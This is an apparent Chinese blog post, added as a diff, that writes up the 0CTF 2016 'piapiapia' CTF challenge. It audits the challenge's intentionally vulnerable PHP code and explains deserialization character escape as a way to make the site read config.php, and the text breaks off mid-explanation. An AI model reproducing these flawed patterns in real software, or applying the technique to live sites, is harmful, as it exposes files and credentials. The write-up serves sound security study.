@@ -1,0 +1,574 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="一道很有意思的反序列化题目，第一次没做出来，看WP了解了 php反序列化字符逃逸的新姿势">
+  <meta name="author" content="Noel">
+  <meta name="keywords" content="">
+  
+  <title>0ctf2016piapiapia - Noel&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"n0el4kls.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>N0el4kLs's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="0ctf2016piapiapia">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-17 05:49" pubdate>
+        2021年7月17日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      39
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">0ctf2016piapiapia</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：几秒前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>一道很有意思的反序列化题目，第一次没做出来，看WP了解了 <code>php反序列化字符逃逸</code>的新姿势</p>
+<span id="more"></span>
+
+<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">https://buuoj.cn/challenges#[0CTF 2016]piapiapia</a></p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="直接-www-zip拿到源码开始审计"><a href="#直接-www-zip拿到源码开始审计" class="headerlink" title="直接/www.zip拿到源码开始审计"></a>直接/<a target="_blank" rel="noopener" href="http://www.zip拿到源码开始审计/">www.zip拿到源码开始审计</a></h3><h4 id="查看一下目录结构"><a href="#查看一下目录结构" class="headerlink" title="查看一下目录结构"></a>查看一下目录结构</h4><p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210716074024552.png" srcset="/img/loading.gif" lazyload alt="目录结构"></p>
+<h4 id="从入口文件开始简单判断一下网站逻辑"><a href="#从入口文件开始简单判断一下网站逻辑" class="headerlink" title="从入口文件开始简单判断一下网站逻辑"></a>从入口文件开始简单判断一下网站逻辑</h4><p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210716075201379.png" srcset="/img/loading.gif" lazyload alt="image-20210716075201379"></p>
+<p>主要逻辑如图所示,剩余的三个文件作用为:</p>
+<ul>
+<li><code>class.php </code>         公共函数模块</li>
+<li><code>config.php</code>       数据库配置文件 flag在里面</li>
+<li><code>register.php</code>   用户注册模块</li>
+</ul>
+<p>在主要逻辑代码中,发现敏感函数</p>
+<p><code>update.php</code> 中发现<code>serialize()</code></p>
+<p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210716075903584.png" srcset="/img/loading.gif" lazyload alt="image-20210716075903584"></p>
+<p><code>profile.php</code>中存在 <code>unserialize()</code> 和<code>file_get_contents()</code></p>
+<p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210716080014278.png" srcset="/img/loading.gif" lazyload alt="image-20210716080014278"></p>
+<p>看样子应该是个反序列化读取文件内容的逻辑.</p>
+<p>对网站结构及文件有了个大概影响之后,开始审计代码.</p>
+<h4 id="update-php-审计"><a href="#update-php-审计" class="headerlink" title="update.php 审计"></a><code>update.php</code> 审计</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);	<br>	&#125;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br>		<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>		<span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br>		<span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br>		<br>		<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br>		<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>		move_uploaded_file(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br>		<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>		<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>		<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>		<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br>		<span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>	&#125;<br>	<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>此php文件对应登录过后的信息提交页面</p>
+<p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210717000959220.png" srcset="/img/loading.gif" lazyload alt="image-20210717000959220"></p>
+<p> 代码主要逻辑为:</p>
+<ol>
+<li>必须传入 <code>phone</code> <code>email</code> <code>nickname</code> 以及<code>photo</code> 4个参数,也就是对应网页的3个表单 + 一个文件</li>
+<li>输入的 3  个表单参数能符合正则匹配,否则退出</li>
+<li>上传文件大小的检测.</li>
+<li>符合以上规则之后,创建一个<code>$profile</code>数组用于存储三个表单参数和文件地址</li>
+<li>执行<code>update_profile()</code>函数,传入的参数分别为<code>$username</code>和<code>serialize($profile)</code></li>
+</ol>
+<p>跟进函数 <code>update_profile()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br>		<span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br>		<span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$new_profile</span>);<br><br>		<span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可发现此函数的逻辑:</p>
+<ol>
+<li>先对传入的参数两个参数分别使用了父类函数<code>filter()</code></li>
+<li>再调用了父类的 <code>update()</code>函数, 并返回 <code>update()</code>的结果</li>
+</ol>
+<p>跟进 <code>filter()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>		<span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br>		<span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>		<span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br>		<span class="hljs-comment">// / &#x27;|\\ /</span><br><br>		<span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>		<span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>		<span class="hljs-comment">//  /select|insert|update|delete|where /</span><br>		<span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可发现其主要逻辑为</p>
+<ol>
+<li>将字符串中的<code>&#39;</code> 和<code>\\</code> 替换为<code>_</code>,这是第一次替换</li>
+<li>将第一次替换后的结果 中的<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>替换为 <code>hacker</code>,并作为最终结果返回</li>
+</ol>
+<p><strong>其实此时已经能感觉到<code>filter()</code>函数的问题了,<code>filer()</code>传入的参数中有个是序列化后的结果,如果对序列化后的结果进行更改,可能导致反序列化的失败.</strong></p>
+<p>跟进一下<code>update()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br>		<span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>主要实现 数据库的更新操作.没有过滤 <code>;</code> 感觉存在堆叠注入.</p>
+<h4 id="profile-php-审计"><a href="#profile-php-审计" class="headerlink" title="profile.php 审计"></a><code>profile.php</code> 审计</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">?php<br>	<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);	<br>	&#125;<br>	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>	<span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;show_profile(<span class="hljs-variable">$username</span>);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br>		header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>	&#125;<br>	<span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-variable">$profile</span> = unserialize(<span class="hljs-variable">$profile</span>);<br>		<span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>		<span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>		<span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>		<span class="hljs-variable">$photo</span> = base64_encode(file_get_contents(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>此php文件对应提交<code>update.php</code>信息提交正确之后 查看提交信息的页面</p>
+<p><img src="/images/2021-07-16-0ctf2016piapiapia/image-20210717004415694.png" srcset="/img/loading.gif" lazyload alt="image-20210717004415694"></p>
+<p>通过审计,可发现次文件的主要代码逻辑为:</p>
+<ol>
+<li>调用 <code>show_profile()</code>函数,通过名称应该能判断是取数据的过程</li>
+<li>如果成功取回数据, 反序列化取回的数据赋值给<code>$profile</code></li>
+<li>分别获取里面的存储的内容,其中照片是使用<code>file_get_contents()</code>读取.</li>
+</ol>
+<p>跟进一下<code>show_profile()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>		<span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br>		<span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>		<span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br></code></pre></td></tr></table></figure>
+
+<p>发现次函数的主要逻辑为,过滤<code>$username</code> 并通过<code>$username</code>查找存储的信息.</p>
+<h4 id="整理过程"><a href="#整理过程" class="headerlink" title="整理过程"></a>整理过程</h4><p>通过对 <code>update.php</code> 以及<code>profile.php</code>文件的审计,以及可以清楚的了解整个网站的逻辑过程:</p>
+<ol>
+<li>提交post 参数,在将通过正则匹配的参数存入数组<code>$profile</code>,</li>
+<li>在将<code>$profile</code> 存入数据库之前,先对<code>$profile</code>进行序列化</li>
+<li>再判断序列化后的内容是否存在特定字符或字符串,若存在,进行相应的替换</li>
+<li>最后通过<code>$username</code> 取出存储的序列化字符串,并将其使用反序列化还原,最后在读取.</li>
+</ol>
+<p>利用链: 利用反序列化字符逃逸,使最后的读取的文件为<code>config.php</code>,从而得到flag.</p>
+<h4 id="反序列化字符逃逸知识"><a href="#反序列化字符逃逸知识" class="headerlink" title="反序列化字符逃逸知识"></a>反序列化字符逃逸知识</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>);<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">// 输出: string(42) &quot;a:3:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;2&quot;;i:2;s:1:&quot;3&quot;;&#125;&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>我们可以看到序列化的结果是以 <code>&quot;;&#125;</code> 结尾</p>
+<p>假设我们能使上面的结果从    <code>a:3:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;2&quot;;i:2;s:1:&quot;3&quot;;&#125;</code></p>
+<p>变为                                            <code>a:3:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;2&quot;;i:2;2:1:&quot;4&quot;;&#125;&quot;i:2;s:1:&quot;3&quot;;&#125;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">如果不好理解,我们假设有模板  a:3:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;&#123;&#125;&quot;;i:2;s:1:&quot;3&quot;;&#125;<br>其中模板中的 &#123;] 可以是任何字符, 式子1为:   a:3:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;2&quot;;i:2;s:1:&quot;3&quot;;&#125;   及将 2  带入模板<br>    式子2为:    a:3:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;2&quot;;i:2;2:1:&quot;4&quot;;&#125;&quot;i:2;s:1:&quot;3&quot;;&#125;           及将  2&quot;;i:2;2:1:&quot;4&quot;;&#125;  带入模板<br></code></pre></td></tr></table></figure>
+
+<p>反序列化 变化后的式子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">var_dump(unserialize(<span class="hljs-string">&#x27;a:3:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;2&quot;;i:2;s:1:&quot;4&quot;;&#125;&quot;i:2;s:1:&quot;3&quot;;&#125;&#x27;</span>));<br><br><span class="hljs-comment">/* 结果如下:</span><br><span class="hljs-comment">array(3) &#123;</span><br><span class="hljs-comment">  [0]=&gt;</span><br><span class="hljs-comment">  string(1) &quot;1&quot;</span><br><span class="hljs-comment">  [1]=&gt;</span><br><span class="hljs-comment">  string(1) &quot;2&quot;</span><br><span class="hljs-comment">  [2]=&gt;</span><br><span class="hljs-comment">  string(1) &quot;4&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">可见 我们以及使用 新添加的内容 覆盖了原来数组的 第二个元素</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="构造反序列字符逃逸"><a href="#构造反序列字符逃逸" class="headerlink" title="构造反序列字符逃逸"></a>构造反序列字符逃逸</h4><p>前面我提到过,<strong>如果对序列化后的结果进行更改,可能导致反序列化的失败.</strong></p>
+<p>因为序列化里是有字符长度规定的,</p>
+<p>还是拿 上面反序列化字符逃逸里的例子将</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#    &#x27;a:3:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;2&quot;;i:2;s:1:&quot;3&quot;;&#125;&#x27;   这是序列化后的正常结果 假设我们替换一处</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:1:&quot;12&quot;;i:1;s:1:&quot;2&quot;;i:2;s:1:&quot;3&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">/* 会出现  Notice:  unserialize(): Error at offset 15 of 43 bytes in on line3   bool(false)的报错</span><br><span class="hljs-comment">原因是因为     &#x27;s:1:&quot;1&quot;&#x27;  表示了储存了一位的字符串  &quot;1&quot;</span><br><span class="hljs-comment">而替换后       &#x27;s:1:&quot;12&quot;&#x27; 表示了储存了一位字符串    &quot;12&quot;,显然不正确, 于是便出现了报错</span><br><span class="hljs-comment"></span><br><span 